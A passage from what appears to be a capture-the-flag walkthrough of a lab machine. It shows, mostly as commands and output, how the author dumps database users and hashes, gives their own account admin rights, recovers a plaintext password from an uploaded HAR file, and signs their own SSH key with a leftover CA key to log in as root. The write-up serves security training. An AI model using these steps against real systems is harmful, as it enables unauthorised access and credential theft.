+    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="nf">setAttribute</span><span class="p">(</span><span class="no">PDO</span><span class="o">::</span><span class="no">ATTR_ERRMODE</span><span class="p">,</span> <span class="no">PDO</span><span class="o">::</span><span class="no">ERRMODE_EXCEPTION</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nc">PDOException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"Connection failed: "</span> <span class="mf">.</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">());</span>
+</code></pre></div></div>
+<h4 id="database">Database</h4>
+<p>I’ll use the database credentials to connect to the database:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@itrc:/var/www/itrc$</span><span class="w"> </span>mysql <span class="nt">-h</span> db <span class="nt">-u</span> jj <span class="nt">-pugEG5rR5SG8uPd</span> 
+<span class="go">Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 33
+Server version: 11.2.2-MariaDB-1:11.2.2+maria~ubu2204 mariadb.org binary distribution
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+</span><span class="gp">MariaDB [(none)]&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>The only interesting db is <code class="language-plaintext highlighter-rouge">resourcecenter</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [(none)]&gt; </span><span class="k">show</span> <span class="n">databases</span><span class="p">;</span>
+<span class="go">+--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| resourcecenter     |
++--------------------+
+2 rows in set (0.001 sec)
+</span></code></pre></div></div>
+<p>It has three tables:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [(none)]&gt; </span><span class="n">use</span> <span class="n">resourcecenter</span><span class="p">;</span>
+<span class="go">Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+</span><span class="gp">MariaDB [resourcecenter]&gt; </span><span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
+<span class="go">+--------------------------+
+| Tables_in_resourcecenter |
++--------------------------+
+| messages                 |
+| tickets                  |
+| users                    |
++--------------------------+
+3 rows in set (0.000 sec)
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">users</code> table has users, but none of the hashes crack with <code class="language-plaintext highlighter-rouge">rockyou.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [resourcecenter]&gt; </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
+<span class="go">+----+-------------+--------------------------------------------------------------+-------+------------+
+| id | user        | password                                                     | role  | department |
++----+-------------+--------------------------------------------------------------+-------+------------+
+|  1 | zzinter     | $2y$10$VCpu.vx5K6tK3mZGeir7j.ly..il/YwPQcR2nUs4/jKyUQhGAriL2 | admin | NULL       |
+|  2 | msainristil | $2y$10$AT2wCUIXC9jyuO.sNMil2.R950wZlVQ.xayHZiweHcIcs9mcblpb6 | admin | NULL       |
+|  3 | mgraham     | $2y$10$4nlQoZW60mVIQ1xauCe5YO0zZ0uaJisHGJMPNdQNjKOhcQ8LsjLZ2 | user  | NULL       |
+|  4 | kgrant      | $2y$10$pLPQbIzcehXO5Yxh0bjhlOZtJ18OX4/O4mjYP56U6WnI6FvxvtwIm | user  | NULL       |
+|  5 | bmcgregor   | $2y$10$nOBYuDGCgzWXIeF92v5qFOCvlEXdI19JjUZNl/zWHHX.RQGTS03Aq | user  | NULL       |
+|  9 | 0xdf        | $2y$10$8toT5vmFASwe.Ui9YnhtZuwff7m9qXtQQzx5Y6UwnWux72AHvNqD6 | user  | NULL       |
++----+-------------+--------------------------------------------------------------+-------+------------+
+6 rows in set (0.000 sec)
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">messages</code> and <code class="language-plaintext highlighter-rouge">tickets</code> tables make up the tickets:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [resourcecenter]&gt; </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">messages</span><span class="p">;</span>
+<span class="go">+----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+---------------------+-----------+---------------------------------------------------------+-----------------+
+| id | message                                                                                                                                                                                                                                 | from_user_id | created_at          | ticket_id | attachment                                              | attachment_name |
++----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+---------------------+-----------+---------------------------------------------------------+-----------------+
+| 18 | I will take care of this.                                                                                                                                                                                                               |            2 | 2024-02-01 12:01:57 |         1 | NULL                                                    | NULL            |
+| 19 | Access granted. Signed key will be emailed to you via encrypted email.                                                                                                                                                                  |            2 | 2024-02-03 09:02:33 |         1 | NULL                                                    | NULL            |
+| 20 | Thank you. Got it.                                                                                                                                                                                                                      |            3 | 2024-02-03 09:03:12 |         1 | NULL                                                    | NULL            |
+| 21 | On it.                                                                                                                                                                                                                                  |            1 | 2024-02-03 14:57:51 |         3 | NULL                                                    | NULL            |
+| 22 | I will take care of this.                                                                                                                                                                                                               |            2 | 2024-02-04 13:44:53 |         4 | NULL                                                    | NULL            |
+| 23 | We're having some issues with the signing process. I'll get back to you once we have that resolved.                                                                                                                                     |            2 | 2024-02-04 14:25:04 |         4 | NULL                                                    | NULL            |
+| 24 | Can you attach a HAR file where the issue happens so the web team can troubleshoot?                                                                                                                                                     |            1 | 2024-02-04 16:12:44 |         5 | NULL                                                    | NULL            |
+| 25 | Attached.                                                                                                                                                                                                                               |            2 | 2024-02-04 16:47:23 |         5 | ../uploads/c2f4813259cc57fab36b311c5058cf031cb6eb51.zip | failure.zip     |
+| 26 | Any update here? There's a bit of a panic going on in finance.                                                                                                                                                                          |            4 | 2024-02-05 08:01:36 |         3 | NULL                                                    | NULL            |
+| 27 | We're going to take four laptops in for reimaging. Will update as that progresses.                                                                                                                                                      |            1 | 2024-02-05 08:12:11 |         3 | NULL                                                    | NULL            |
+| 28 | They see the issue. I'm going to have to work with the IT team in corporate to get this resolved. For now, they've given me access to the IT server and a bash script to generate keys. I'll handle all SSH provisioning tickets.       |            1 | 2024-02-05 15:32:54 |         5 | NULL                                                    | NULL            |
+| 29 | It's this kind of stuff that makes me say it was a bad idea to move off the old system.                                                                                                                                                 |            2 | 2024-02-05 15:45:11 |         5 | NULL                                                    | NULL            |
+| 30 | I've sent you the signed key via secure email                                                                                                                                                                                           |            1 | 2024-02-06 09:12:11 |         4 | NULL                                                    | NULL            |
+| 31 | Got it. Thanks.                                                                                                                                                                                                                         |            5 | 2024-02-06 11:25:33 |         4 | NULL                                                    | NULL            |
+| 32 | The API from the IT server seems to be working well now. I've got a script that will sign public keys with the appropriate principal to validate it works. I'm still handling these tickets, but hopefully we'll have it resolved soon. |            1 | 2024-02-07 16:21:23 |         5 | NULL                                                    | NULL            |
+| 33 | The new system is super flakey. I know it won't work across the rest of the company, but I'm going to at least leave the old certificate in place here until we prove we can work on the new one                                        |            2 | 2024-02-09 16:45:19 |         2 | NULL                                                    | NULL            |
+| 34 | Old certificates have been taken out of /etc. I've got the old signing cert secured. This server will trust both the old and the new for some time until we work out any issues with the new system.                                    |            2 | 2024-02-10 09:12:11 |         2 | NULL                                                    | NULL            |
+| 35 | Thanks for the update. I'm sure the new system will be fine. Closing this ticket.                                                                                                                                                       |            1 | 2024-02-10 11:27:43 |         2 | NULL                                                    | NULL            |
+| 36 | All testing of the updated API seems good. At IT's request I've deleted my SSH keys for their server. I'll still handle tickets using the script until we get a chance to update the ITRC web admin panel to use it.                    |            1 | 2024-02-10 11:53:42 |         5 | NULL                                                    | NULL            |
++----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+---------------------+-----------+---------------------------------------------------------+-----------------+
+19 rows in set (0.000 sec)
+
+</span><span class="gp">MariaDB [resourcecenter]&gt; </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tickets</span><span class="p">;</span>
+<span class="go">+----+----------------------------------------------+--------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------------+---------------------------------------------------------+--------------------------------+
+| id | subject                                      | status | body                                                                                                                                                                                                                                                             | created_at          | submitted_by | attachment                                              | attachment_name                |
++----+----------------------------------------------+--------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------------+---------------------------------------------------------+--------------------------------+
+|  1 | Need SSH Access to HR Server                 | closed | I need to access the HR server to update the employee handbook.                                                                                                                                                                                                  | 2024-02-01 08:09:21 |            3 | ../uploads/e8c6575573384aeeab4d093cc99c7e5927614185.zip | pubkey-mgraham-please-sign.zip |
+|  2 | Decommission ITRC SSH Certificate            | closed | We need to decommission the old ITRC SSH certificate infrastructure in favor of the new organization-wide IT signing certs. I'm handling the transition to the new system from the ITSC-side. Mike - Can you handle removing the old certs from the ITRC server? | 2024-02-02 13:12:11 |            1 | NULL                                                    | NULL                           |
+|  3 | Malware in finance dept                      | open   | We have detected malware on the finance department server. We need to take it offline and clean it.                                                                                                                                                              | 2024-02-03 14:12:11 |            4 | NULL                                                    | NULL                           |
+|  4 | Please provision access to marketing servers | closed | I'm new to the IT team, need access to the marketing servers in order to apply updates and configure firewall. Public key attached.                                                                                                                              | 2024-02-04 13:27:27 |            5 | ../uploads/eb65074fe37671509f24d1652a44944be61e4360.zip | mcgregor_pub.zip               |
+|  5 | SSH Key Signing Broken                       | open   | The admin panel is supposed to allow me to get a signed certificate, but it just isn't working.                                                                                                                                                                   | 2024-02-04 14:19:54 |            2 | NULL                                                    | NULL                           |
+|  9 | webshell                                     | open   | this is a webshell                                                                                                                                                                                                                                               | 2024-11-20 22:02:14 |            9 | ../uploads/a34387cd3eef30b8d5938ed770909f9a536d8fe0.zip | shell.zip                      |
++----+----------------------------------------------+--------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------------+---------------------------------------------------------+--------------------------------+
+6 rows in set (0.001 sec)
+</span></code></pre></div></div>
+<p>There’s a story with hints as to where to go next, but it’s easier to see them via the website. I’ll set my user to admin:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [resourcecenter]&gt; </span><span class="k">update</span> <span class="n">users</span> <span class="k">set</span> <span class="k">role</span><span class="o">=</span><span class="nv">"admin"</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">9</span><span class="p">;</span>
+<span class="go">Query OK, 1 row affected (0.003 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+</span></code></pre></div></div>
+<h4 id="tickets">Tickets</h4>
+<p>On logging back in, there’s an additional button in the menu bar:</p>
+<picture>
+<source srcset="/img/image-20240218141844969.webp" type="image/webp"/>
+<img alt="image-20240218141844969" class="include_image" loading="lazy" src="/img/image-20240218141844969.png"/>
+</picture>
+<p>The admin panel gives access to “Admin Tools” as well as “All Tickets”:</p>
+<picture>
+<source srcset="/img/image-20240218141920675.webp" type="image/webp"/>
+<img alt="image-20240218141920675" class="include_image" loading="lazy" src="/img/image-20240218141920675.png"/>
+</picture>
+<p>There are a few tickets that give useful information about the path forward.</p>
+<p>ID2 talks about zzinter decommissioning the ITRC SSH certificate signing cert, in favor of the new organization-wide IT one. msainristil is says he has the signing certs that are still trusted by this server:</p>
+<picture>
+<source srcset="/img/image-20241120172405239.webp" type="image/webp"/>
+<img alt="image-20241120172405239" class="include_image" loading="lazy" src="/img/image-20241120172405239.png"/>
+</picture>
+<p>Ticket ID5 is msainristil complaining that the admin tools for signing certificates isn’t working. zzinter asks for a <code class="language-plaintext highlighter-rouge">.har</code> file to show it not working. msainristil attaches. zzineter finds the issue, wrks with IT to get a solution. For now, there’s an API on the IT server that handles this, but it isn’t integrated with the admin page yes, and he’ll handle these with a script:</p>
+<picture>
+<source srcset="/img/image-20240218142420811.webp" type="image/webp"/>
+<img alt="image-20240218142420811" class="include_image" loading="lazy" src="/img/image-20240218142420811.png"/>
+</picture>
+<p>Both these tickets / messages can be read directly from the database as well.</p>
+<h4 id="uploads-1">Uploads</h4>
+<p>I can download the <code class="language-plaintext highlighter-rouge">.har</code> file from the web, or skip all of that enumeration and go directly to the <code class="language-plaintext highlighter-rouge">uploads</code> directory when I first get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@itrc:/var/www/itrc/uploads$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 1156
+-rw-r--r-- 1 www-data www-data     136 Feb 18 14:20 bc7bf3b3864ecdca3d17e75d37596ea4c2cfa0e7.zip
+-rw-rw-r-- 1 www-data www-data 1162513 Feb  6 21:38 c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
+-rw-r--r-- 1 www-data www-data     128 Feb 18 14:16 cc589609094dd8d5c1001b3ab2b8d59aacef96ba.zip
+-rw-rw-r-- 1 www-data www-data     634 Feb  6 21:46 e8c6575573384aeeab4d093cc99c7e5927614185.zip
+-rw-rw-r-- 1 www-data www-data     275 Feb  6 21:42 eb65074fe37671509f24d1652a44944be61e4360.zip
+-rw-r--r-- 1 www-data www-data     151 Feb 18 14:22 f02f1654261b61d5efba180f0110f529166c2bef.zip
+</span></code></pre></div></div>
+<p>There are several here, but the one that matters is the large one, that has a <code class="language-plaintext highlighter-rouge">.har</code> file in it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@itrc:/var/www/itrc/uploads$</span><span class="w"> </span>unzip <span class="nt">-l</span> c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
+<span class="go">Archive:  c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+  1903087  2024-02-06 21:36   itrc.ssg.htb.har
+---------                     -------
+  1903087                     1 file
+</span></code></pre></div></div>
+<p>I’ll download a copy to my host.</p>
+<h3 id="har-file">Har File</h3>
+<p>A Har file is a export of a web session. It has come up in the new in the <a href="https://www.reco.ai/blog/securing-your-okta-environment-after-the-har-breach-how-sspm-can-help">October 2023 Okta breach</a>, where Har files submitted by customers were in the database and allowed attackers to recover session tokens.</p>
+<p><a href="https://twitter.com/merill/status/1716259950086001017">This tweet</a> summarized the issue well:</p>
+<blockquote class="twitter-tweet"><p dir="ltr" lang="en">What are HAR files?<br/>A HAR file is a recording of your current session &amp; includes all web traffic including secrets &amp; tokens.<br/><br/>Admins usually share these files with customer support when troubleshooting issues.<br/><br/>Here's a thread on how you can handle .har files safely.<br/><br/>🧵⬇️ <a href="https://t.co/ENJ81BNDiv">pic.twitter.com/ENJ81BNDiv</a></p>— Merill Fernando (@merill) <a href="https://twitter.com/merill/status/1716259950086001017?ref_src=twsrc%5Etfw">October 23, 2023</a></blockquote>
+<script async="" charset="utf-8" src="https://platform.twitter.com/widgets.js"></script>
+<p>In this case, it isn’t the session token that I find, but the user actually logged in while captureing data, leaving their credentials in the clear in the <code class="language-plaintext highlighter-rouge">.har</code>:</p>
+<picture>
+<source srcset="/img/image-20240218143535577.webp" type="image/webp"/>
+<img alt="image-20240218143535577" class="include_image" loading="lazy" src="/img/image-20240218143535577.png"/>
+</picture>
+<h3 id="su--ssh">su / SSH</h3>
+<p>This password works to log into the webpage as msainristil, but it also works for <code class="language-plaintext highlighter-rouge">su</code> or SSH on port 22, which provides a shell in the itrc container:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> 82yards2closeit ssh msainristil@itrc.ssg.htb
+<span class="go">Linux itrc 5.15.0-94-generic #104-Ubuntu SMP Tue Jan 9 15:25:40 UTC 2024 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+</span><span class="gp">msainristil@itrc:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>The creds do not work on port 2222:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> 82yards2closeit ssh <span class="nt">-p</span> 2222 msainristil@itrc.ssg.htb
+<span class="go">Permission denied, please try again.
+</span></code></pre></div></div>
+<h2 id="shell-as-root-in-itrc">Shell as root in itrc</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>In msainristil’s home directory, there’s a directory called <code class="language-plaintext highlighter-rouge">decommission_old_ca</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msainristil@itrc:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 36
+drwxr-xr-x 1 msainristil msainristil 4096 Feb  8 20:00 .
+drwxr-xr-x 1 root        root        4096 Feb  8 13:42 ..
+-rw-r--r-- 1 msainristil msainristil  220 Apr 23  2023 .bash_logout
+-rw-r--r-- 1 msainristil msainristil 3526 Apr 23  2023 .bashrc
+-rw-r--r-- 1 msainristil msainristil  807 Apr 23  2023 .profile
+drwxr-xr-x 1 msainristil msainristil 4096 Jan 24 22:21 decommission_old_ca
+</span></code></pre></div></div>
+<p>It has a certificate authority key pair:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msainristil@itrc:~/decommission_old_ca$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">ca-itrc  ca-itrc.pub
+</span></code></pre></div></div>
+<p>In <code class="language-plaintext highlighter-rouge">/etc/sshd_config.d</code> there’s an <code class="language-plaintext highlighter-rouge">sshcerts.conf</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msainristil@itrc:/etc/ssh$</span><span class="w"> </span><span class="nb">cat </span>sshd_config.d/sshcerts.conf 
+<span class="go">HostKey /etc/ssh/ssh_host_rsa_key
+HostKey /etc/ssh/ssh_host_ecdsa_key
+HostKey /etc/ssh/ssh_host_ed25519_key
+HostCertificate /etc/ssh/ssh_host_rsa_key-cert.pub
+HostCertificate /etc/ssh/ssh_host_ecdsa_key-cert.pub
+HostCertificate /etc/ssh/ssh_host_ed25519_key-cert.pub
+TrustedUserCAKeys /etc/ssh/ca_users_keys.pub
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">ca_user_keys.pub</code> file has two public keys:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msainristil@itrc:/etc/ssh$</span><span class="w"> </span><span class="nb">cat </span>ca_users_keys.pub 
+<span class="go">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoBD1UoFfL41g/FVX373rdm5WPz+SZ0bWt5PYP+dhok4vb3UpJPIGOeAsXmAkzEVYBHIiE+aGbrcXvDaSbZc6cI2aZfFraEPt080KVKHALAPgaOn/zFdld8P9yaENKBKltWLZ9I6rwg98IGEToB7JNZF9hzasjjD0IDKv8JQ3NwimDcZTc6Le0hJw52ANcLszteliFSyoTty9N/oUgTUjkFsgsroEh+Onz4buVD2bxoZ+9mODcdYTQ4ChwanfzFSnTrTtAQrJtyH/bDRTa2BpmdmYdQu+4HcbDl5NbiEwu1FNskz/YNDPkq3bEYEOvgMiu/0ZMy0wercx6Tn0G2cppS70/rG5GMcJi0WTcUic3k+XJ191WEG1EtXJNbZdtJc7Ky0EKhat0dgck8zpq62kejtkBQd86p6FvR8+xH3/JMxHvMNVYVODJt/MIik99sWb5Q7NCVcIXQ0ejVTzTI9QT27km/FUgl3cs5CZ4GIN7polPenQXEmdmbBOWD2hrlLs= ITRC Certificate CA
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIHg8Cudy1ShyYfqzC3ANlgAcW7Q4MoZuezAE8mNFSmx Global SSG SSH Certificate from IT
+</span></code></pre></div></div>
+<p>There’s an RSA key from ITRC, and a ED25519 key from IT. This matches what was discussed in the tickets previously. If I have a key pair that’s signed by either of these two CA’s, it’ll be accepted by the server. I’ll exfil these files.</p>
+<h3 id="ssh">SSH</h3>
+<h4 id="sign-key">Sign Key</h4>
+<p>I’ll sign my public key with <code class="language-plaintext highlighter-rouge">ssh-keygen</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh-keygen <span class="nt">-s</span> ca_itrc <span class="nt">-z</span> 223 <span class="nt">-I</span> <span class="s1">'0xdf'</span> <span class="nt">-V</span> <span class="nt">-5m</span>:forever <span class="nt">-n</span> root ~/keys/ed25519_gen.pub
+<span class="go">Signed user key /home/oxdf/keys/ed25519_gen-cert.pub: id "0xdf" serial 223 for root valid after 2024-11-16T17:36:12
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">-s</code> specifies the CA certificate, <code class="language-plaintext highlighter-rouge">-z</code> is a serial id which doesn’t really matter. <code class="language-plaintext highlighter-rouge">-I</code> is the certificate identity. <code class="language-plaintext highlighter-rouge">-V</code> is the valid time. and <code class="language-plaintext highlighter-rouge">-n</code> is the principle that I am signing the key to represent.</p>
+<p>That creates a <code class="language-plaintext highlighter-rouge">ed33519_gen-cert.pub</code> file in the same directory:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat</span> ~/keys/ed25519_gen-cert.pub
+<span class="go">ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAIKqvApq1a54dGjbpJS5VaAQzQ+Le83fv7gwX86DR2iReAAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3dAAAAAAAAAN8AAAABAAAABDB4ZGYAAAAIAAAABHJvb3QAAAAAZdJg5P//////////AAAAAAAAAIIAAAAVcGVybWl0LVgxMS1mb3J3YXJkaW5nAAAAAAAAABdwZXJtaXQtYWdlbnQtZm9yd2FyZGluZwAAAAAAAAAWcGVybWl0LXBvcnQtZm9yd2FyZGluZwAAAAAAAAAKcGVybWl0LXB0eQAAAAAAAAAOcGVybWl0LXVzZXItcmMAAAAAAAAAAAAAAZcAAAAHc3NoLXJzYQAAAAMBAAEAAAGBAOgEPVSgV8vjWD8VVffvet2blY/P5JnRta3k9g/52GiTi9vdSkk8gY54CxeYCTMRVgEciIT5oZutxe8NpJtlzpwjZpl8WtoQ+3TzQpUocAsA+Bo6f/MV2V3w/3JoQ0oEqW1Ytn0jqvCD3wgYROgHsk1kX2HNqyOMPQgMq/wlDc3CKYNxlNzot7SEnDnYA1wuzO16WIVLKhO3L03+hSBNSOQWyCyugSH46fPhu5UPZvGhn72Y4Nx1hNDgKHBqd/MVKdOtO0BCsm3If9sNFNrYGmZ2Zh1C77gdxsOXk1uITC7UU2yTP9g0M+SrdsRgQ6+AyK7/RkzLTB6tzHpOfQbZymlLvT+sbkYxwmLRZNxSJzeT5cnX3VYQbUS1ck1tl20lzsrLQQqFq3R2ByTzOmrraR6O2QFB3zqnoW9Hz7Eff8kzEe8w1VhU4Mm38wiKT32xZvlDs0JVwhdDR6NVPNMj1BPbuSb8VSCXdyzkJngYg3umiU96dBcSZ2ZsE5YPaGuUuwAAAZQAAAAMcnNhLXNoYTItNTEyAAABgBktNKBLZ8uo6Pb+1Rw9rKuUgbdVkE3HvIQe8k6VPjl59cAIGj0cfyDDtUBTyIbMCDOLVuAu/P0bKioN+WdQI/Wh6Lyisnb4n8KbIGFopNEKuhxenFFYJo3rV3wqZ62qQJxUIcGkEIWqxlaozW51yNcIGZ6XNwweqkXG4wau+wYyMsQAnFLgJG0iLBA6v/G6cuwzEJQY95RjcH2UgSahlWC5Po7a1TAARu+eC88vVsVvZINVU9OLiUnTGPbkwt7ftFjLYZVLyrTEsIxmYkj7cig4jN+EAZgXMT8j+AlVX+ZswTrUpbuEdFisz+1QgOYxJz+PouT3qVHi3z2I1t6lAaPGR+LoNcS7xJ0MEuV90I1qLha0dPyDBxg2CIlDfmL0GmjjIRlO4/LSgWilAHFDPgtydxBlZsmfKOIF9VgPlgOA/FJrTIOTaN5FidlYy+4i/cgrQDHwWSxoViIQ1MGQOCiVQdcgRNjQCQB6d8nDehwEw5McR9w3CrhkRqdRtgAigQ== nobody@nothing
+</span></code></pre></div></div>
+<h4 id="connect">Connect</h4>
+<p>That signed key allows me to connect as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen root@itrc.ssg.htb
+<span class="gp">Linux itrc 5.15.0-94-generic #</span>104-Ubuntu SMP Tue Jan 9 15:25:40 UTC 2024 x86_64
+<span class="go">...[snip]...
+</span><span class="gp">root@itrc:~#</span><span class="w"> 
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">user.txt</code> is in zzinter’s home directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@itrc:/home/zzinter#</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">cdbc7870************************
+</span></code></pre></div></div>
+<h2 id="shell-as-support-on-it-host">Shell as support on IT (host)</h2>
+<h3 id="enumeration-2">Enumeration</h3>
+<p>In zzinter’s home directory there’s a bash script that interacts with the IT API to handle certificate signing:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@itrc:/home/zzinter#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">sign_key_api.sh   user.txt
+</span></code></pre></div></div>
+<p>The script has a usage that makes clear how it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@itrc:/home/zzinter#</span><span class="w"> </span>./sign_key_api.sh 
+<span class="go">Usage: ./sign_key_api.sh &lt;public_key_file&gt; &lt;username&gt; &lt;principal&gt;
+</span></code></pre></div></div>
+<p>The script shows how this works:</p>
+<div class="language-bash wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+usage <span class="o">()</span> <span class="o">{</span>
+    <span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> &lt;public_key_file&gt; &lt;username&gt; &lt;principal&gt;"</span>
+    <span class="nb">exit </span>1
+<span class="o">}</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-ne</span> 3 <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span>usage
+<span class="k">fi
+
+</span><span class="nv">public_key_file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
+<span class="nv">username</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
+<span class="nv">principal_str</span><span class="o">=</span><span class="s2">"</span><span class="nv">$3</span><span class="s2">"</span>
+
+<span class="nv">supported_principals</span><span class="o">=</span><span class="s2">"webserver,analytics,support,security"</span>
+<span class="nv">IFS</span><span class="o">=</span><span class="s1">','</span> <span class="nb">read</span> <span class="nt">-ra</span> principal <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$principal_str</span><span class="s2">"</span>
+<span class="k">for </span>word <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">principal</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
+    if</span> <span class="o">!</span> <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$supported_principals</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-qw</span> <span class="s2">"</span><span class="nv">$word</span><span class="s2">"</span><span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Error: '</span><span class="nv">$word</span><span class="s2">' is not a supported principal."</span>
+        <span class="nb">echo</span> <span class="s2">"Choose from:"</span>
+        <span class="nb">echo</span> <span class="s2">"    webserver - external web servers - webadmin user"</span>
+        <span class="nb">echo</span> <span class="s2">"    analytics - analytics team databases - analytics user"</span>
+        <span class="nb">echo</span> <span class="s2">"    support - IT support server - support user"</span>
+        <span class="nb">echo</span> <span class="s2">"    security - SOC servers - support user"</span>
+        <span class="nb">echo
+        </span>usage
+    <span class="k">fi
+done
+
+if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$public_key_file</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"Error: Public key file '</span><span class="nv">$public_key_file</span><span class="s2">' not found."</span>
+    usage
+<span class="k">fi
+
+</span><span class="nv">public_key</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$public_key_file</span><span class="si">)</span>
+
